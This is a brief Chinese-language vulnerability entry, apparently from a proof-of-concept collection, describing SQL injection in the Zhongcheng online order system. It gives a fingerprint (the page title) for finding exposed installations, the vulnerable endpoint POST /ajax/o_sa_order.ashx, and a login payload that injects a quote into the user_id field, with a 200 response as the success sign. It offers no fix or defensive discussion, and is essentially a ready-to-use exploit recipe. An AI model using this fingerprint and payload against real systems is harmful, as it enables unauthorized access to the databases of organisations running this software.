# 众诚网上订单系统o_sa_order存在SQL注入漏洞

众诚网上订单系统 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎使用众诚网上订单系统"`
- **请求**：`POST /ajax/o_sa_order.ashx HTTP/1.1`

**Payload**
```
type=login&user_id=admin'&user_pwd=1111111
```
- **响应特征**：200